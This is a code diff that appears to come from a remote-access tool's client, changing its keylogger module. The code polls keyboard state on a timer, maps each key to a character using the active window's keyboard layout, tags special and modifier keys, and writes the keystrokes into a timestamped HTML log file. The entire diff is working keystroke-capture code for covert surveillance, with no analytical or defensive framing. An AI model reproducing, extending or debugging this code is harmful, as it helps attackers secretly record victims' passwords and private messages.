@@ -68,13 +68,13 @@ namespace xClient.Core.Keylogger
         /// Retrieves an array of all keylogger keys that are special.
         /// </summary>
         /// <returns></returns>
-        private static KeyloggerKeys[] GetSpecialKeys()
+        private KeyloggerKeys[] GetSpecialKeys()
         {
             List<KeyloggerKeys> SpecialKeys = new List<KeyloggerKeys>();
 
             try
             {
-                foreach (KeyloggerKeys key in Enum.GetValues(typeof(KeyloggerKeys)))
+                foreach (KeyloggerKeys key in _allKeys)
                 {
                     try
                     {
@@ -97,7 +97,7 @@ namespace xClient.Core.Keylogger
         /// Retrieves an array of all keylogger keys that are supported.
         /// </summary>
         /// <returns></returns>
-        private static KeyloggerKeys[] GetKeyloggerKeys()
+        private KeyloggerKeys[] GetKeyloggerKeys()
         {
             List<KeyloggerKeys> NormalKeys = new List<KeyloggerKeys>();
 
@@ -107,7 +107,11 @@ namespace xClient.Core.Keylogger
                 {
                     try
                     {
-                        NormalKeys.Add(key);
+                        // Must be supported (have a string representation of the key).
+                        if (!string.IsNullOrEmpty(key.GetKeyloggerKeyName()))
+                        {
+                            NormalKeys.Add(key);
+                        }
                     }
                     catch
                     { }
@@ -123,7 +127,14 @@ namespace xClient.Core.Keylogger
 
         private string HighlightSpecialKey(string name)
         {
-            return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
+            if (!string.IsNullOrEmpty(name))
+            {
+                return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
+            }
+            else
+            {
+                return string.Empty;
+            }
         }
 
         private void timerEmptyKeyBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
@@ -134,14 +145,48 @@ namespace xClient.Core.Keylogger
             {
                 try
                 {
+                    // Make sure that the key that was logged is not null.
+                    // If it is, we can safely ignore it by just making it
+                    // stop here.
                     if (k != null)
                     {
-                        if (k.ModifierKeys.ShiftKeyPressed && !(k.ModifierKeys.CtrlKeyPressed || k.ModifierKeys.AltKeyPressed))
-                        {_logFileBuffer.Append(HighlightSpecialKey(
+                        // If any modifier key was set besides shift and caps
+                        // lock, we will handle it differently than we would
+                        // normal keys.
+                        if (k.ModifierKeysSet)
+                        {
+                            // If the pressed key is special, it should be treated as such
+                            // by using its provided name.
+                            if (k.PressedKey.IsSpecialKey())
+                            {
+                                // The returned string could be empty. If it is, ignore it
+                                // because we don't know how to handle that special key.
+                                // The key would be considered unsupported.
+                                string pressedKey = k.PressedKey.GetKeyloggerKeyName();
+
+                                if (!string.IsNullOrEmpty(pressedKey))
+                                {
+                                    _logFileBuffer.Append(HighlightSpecialKey(pressedKey));
+                                }
+                            }
+                            else
+                            {
+                                // The pressed key is not special, but we have encountered
+                                // a situation of multiple key presses, so just build them.
+                                _logFileBuffer.Append(HighlightSpecialKey(k.ModifierKeys.BuildString() +
+                                                      FromKeys(k, false)));
+                            }
                         }
+                        // We don't have to worry about nearly all modifier keys...
+                        // With the exception of the shift key and caps lock! :)
+                        // At this point we know that shift or caps lock was the
+                        // only pressed key.
                         else
                         {
-                            if (k
+                            // There is not really a need to handle if caps lock or
+                            // shift has been handled because the way we obtain the
+                            // value of the pressed key (that is not special) will
+                            // use the key states and determine for us.
                             _logFileBuffer.Append(FromKeys(k));
                         }
                     }
@@ -166,7 +211,7 @@ namespace xClient.Core.Keylogger
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
             // Loop through each value in the array of keys to record.
-            foreach (short i in _allKeys)
+            foreach (byte i in _allKeys)
             {
                 // GetAsycKeyState returns the result by setting the most significant
                 // bit if the key is up, and sets the least significant bit if the
@@ -175,7 +220,7 @@ namespace xClient.Core.Keylogger
                 {
                     try
                     {
-                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)(byte)i };
+                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)i };
                         KeyToLog.RecordModifierKeys();
 
                         _keyBuffer.Add(KeyToLog);
@@ -225,9 +270,8 @@ namespace xClient.Core.Keylogger
                         {
                             if (writeHeader)
                             {
-                                sw.Write(
-                                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
-                                    DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");
+                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
+                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");
 
                                 if (_logFileBuffer.Length > 0)
                                     sw.Write(_logFileBuffer);
@@ -268,26 +312,25 @@ namespace xClient.Core.Keylogger
             return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
         }
 
-        private char? FromKeys(LoggedKey key)
+        private char? FromKeys(LoggedKey key, bool AllowCapitalization = true)
         {
             //keyStates is a byte array that specifies the current state of the keyboard and keys
             //The keys we are interested in are modifier keys such as shift and caps lock
             byte[] keyStates = new byte[256];
 
-            keyStates[(int)KeyloggerKeys.VK_SHIFT] = key.ModifierKeys.ShiftKeyPressed ? (byte)255 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_MENU] = key.ModifierKeys.CtrlKeyPressed   ? (byte)255 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_CONTROL] = key.ModifierKeys.AltKeyPressed ? (byte)255 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_SHIFT] = (key.ModifierKeys.ShiftKeyPressed && AllowCapitalization) ? (byte)128 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_CAPITAL] = (key.ModifierKeys.CapsLock && AllowCapitalization) ? (byte)128 : (byte)0;
 
-            // Hmmm... What is the toggle state of active as represented by a byte?
-            //keyStates[(int)KeyloggerKeys.VK_CAPITAL] = key.ModifierKeys.CapsLock  ? (byte)255 : (byte)0;
-            //keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = key.ModifierKeys.NumLock   ? (byte)255 : (byte)0;
-            //keyStates[(int)KeyloggerKeys.VK_SCROLL] = key.ModifierKeys.ScrollLock ? (byte)255 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_MENU] = key.ModifierKeys.CtrlKeyPressed ? (byte)128 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_CONTROL] = key.ModifierKeys.AltKeyPressed ? (byte)128 : (byte)0;
+
+            keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = key.ModifierKeys.NumLock ? (byte)128 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_SCROLL] = key.ModifierKeys.ScrollLock ? (byte)128 : (byte)0;
 
             var sb = new StringBuilder(10);
 
             return Win32.ToUnicodeEx(key.PressedKey.GetKeyloggerKeyValue(), 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
-                                     ? (char?)sb[0]
-                                     : null;
+                                     ? (char?)sb[0] : null;
         }
     }
 }
